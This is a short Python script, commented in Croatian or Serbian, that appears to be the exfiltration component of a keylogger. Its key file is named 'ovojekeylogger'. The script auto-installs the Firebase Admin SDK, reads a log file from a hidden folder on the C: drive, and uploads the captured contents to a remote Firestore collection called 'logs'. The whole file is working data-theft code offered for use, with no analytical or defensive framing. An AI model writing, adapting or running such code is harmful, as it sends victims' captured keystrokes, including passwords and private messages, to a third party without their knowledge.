import subprocess
import sys
try:
    import firebase_admin
    from firebase_admin import credentials, firestore
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "firebase-admin"])
    import firebase_admin
    from firebase_admin import credentials, firestore

# Učitaj Firebase Admin SDK ključeve (preuzmi JSON iz Firebase Console)
cred = credentials.Certificate("ovojekeylogger-firebase-adminsdk-fbsvc-d7d6caa752.json")
firebase_admin.initialize_app(cred)

# Poveži se na Firestore
db = firestore.client()

# Pročitaj sadržaj tekstualne datoteke
file_path = r"c:\skriveni_folder\log.txt"
with open(file_path, "r", encoding="utf-8") as file:
    text_content = file.read()

# Kreiraj dokument u kolekciji 'logs'
doc_ref = db.collection("logs").add({"content": text_content})
